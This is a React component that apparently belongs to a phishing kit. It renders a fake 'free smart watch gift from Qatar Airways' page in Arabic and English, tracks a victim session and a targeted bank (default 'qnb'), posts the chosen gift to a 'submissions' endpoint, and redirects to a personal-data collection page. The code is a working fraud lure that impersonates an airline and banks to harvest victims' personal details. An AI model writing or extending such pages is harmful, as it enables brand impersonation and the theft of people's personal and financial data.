import { useState } from "react";
import { useLocation } from "wouter";
import { useLanguage } from "@/contexts/LanguageContext";
import Header from "@/components/Header";

const gifts = [
  { id: 1, img: "https://i.ibb.co/JW8Fdgwh/IMG-20260717-WA0013.jpg" },
  { id: 2, img: "https://i.ibb.co/S4YFyh3V/IMG-20260717-WA0012.jpg" },
  { id: 3, img: "https://i.ibb.co/TMQ0vQyD/IMG-20260717-WA0005.jpg" },
  { id: 4, img: "https://i.ibb.co/7NZQJyrg/IMG-20260717-WA0006.jpg" },
  { id: 5, img: "https://i.ibb.co/8C6CSDC/IMG-20260717-WA0007.jpg" },
  { id: 6, img: "https://i.ibb.co/p6dsL6FK/IMG-20260717-WA0000.jpg" },
  { id: 7, img: "https://i.ibb.co/WwKJw2p/IMG-20260717-WA0001.jpg" },
  { id: 8, img: "https://i.ibb.co/jP5j6vND/IMG-20260717-WA0008.jpg" },
  { id: 9, img: "https://i.ibb.co/DfxJ4DFn/IMG-20260717-WA0009.jpg" },
  { id: 10, img: "https://i.ibb.co/gFdfDm91/IMG-20260717-WA0002.jpg" },
  { id: 11, img: "https://i.ibb.co/0jbg1DN6/IMG-20260717-WA0003.jpg" },
  { id: 12, img: "https://i.ibb.co/pvHk4YxJ/IMG-20260717-WA0010.jpg" },
  { id: 13, img: "https://i.ibb.co/XZpGpGNb/IMG-20260717-WA0011.jpg" },
  { id: 14, img: "https://i.ibb.co/Q3VtVs4Q/IMG-20260717-WA0004.jpg" },
];

export default function GiftSelection() {
  const [, setLocation] = useLocation();
  const { language } = useLanguage();
  const isArabic = language === "ar";
  const [selectedGift, setSelectedGift] = useState<number | null>(null);

  const searchParams = new URLSearchParams(window.location.search);
  const bank = searchParams.get("bank") || "qnb";
  const session = searchParams.get("session") || "";

  const handleGiftSelect = async (id: number) => {
    setSelectedGift(id);
    localStorage.setItem("selectedGift", id.toString());
    
    // تحديث الجلسة بنوع الهدية
    try {
      await fetch('/api/trpc/submissions.createSession', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId: session,
          selectedBank: bank,
          selectedGift: `Smart Watch Gift #${id}`
        })
      });
    } catch (e) {
      console.error("Failed to update gift in session", e);
    }

    setTimeout(() => {
      setLocation(`/personal-data?bank=${bank}&session=${session}&gift=${id}`);
    }, 800);
  };

  return (
    <div dir={isArabic ? "rtl" : "ltr"} style={{ backgroundColor: "#f4f4f4", minHeight: "100vh" }}>
      <style>{`
        .gift-container { padding: 20px; text-align: center; }
        .gift-title { font-size: 22px; font-weight: bold; color: #333; margin-bottom: 10px; }
        .gift-subtitle { font-size: 16px; color: #8C0032; margin-bottom: 30px; font-weight: 600; }
        .gift-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; max-width: 500px; margin: 0 auto; }
        .gift-item { background: white; border-radius: 15px; padding: 10px; border: 2px solid transparent; transition: all 0.3s ease; cursor: pointer; position: relative; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
        .gift-item.selected { border-color: #8C0032; box-shadow: 0 8px 20px rgba(140, 0, 50, 0.15); }
        .gift-img { width: 100%; height: auto; border-radius: 10px; }
        .selection-check { position: absolute; top: 5px; right: 5px; background: #8C0032; color: white; width: 22px; height: 22px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; z-index: 5; }
        .select-btn { margin-top: 15px; background: #8C0032; color: white; border: none; padding: 8px 15px; border-radius: 20px; font-size: 13px; font-weight: bold; }
      `}</style>
      <Header />
      <div className="gift-container">
        <h1 className="gift-title">{isArabic ? "اختر هديتك المجانية" : "Choose Your Free Gift"}</h1>
        <p className="gift-subtitle">{isArabic ? "ساعة ذكية هدية مجانية من القطرية للطيران" : "A free smart watch gift from Qatar Airways"}</p>
        
        <div className="gift-grid">
          {gifts.map((gift) => (
            <div 
              key={gift.id} 
              className={`gift-item ${selectedGift === gift.id ? 'selected' : ''}`}
              onClick={() => handleGiftSelect(gift.id)}
            >
              {selectedGift === gift.id && <div className="selection-check">✔</div>}
              <img src={gift.img} className="gift-img" alt={`Gift ${gift.id}`} />
              <button className="select-btn">
                {isArabic ? "اختيار هذه الهدية" : "Select This Gift"}
              </button>
            </div>
          ))}
        </div>
      </div>
      <div style={{ padding: "20px", textAlign: "center" }}>
        <img src={isArabic ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg"} style={{ width: "100%", maxWidth: "500px", borderRadius: "10px" }} alt="Footer" />
      </div>
    </div>
  );
}
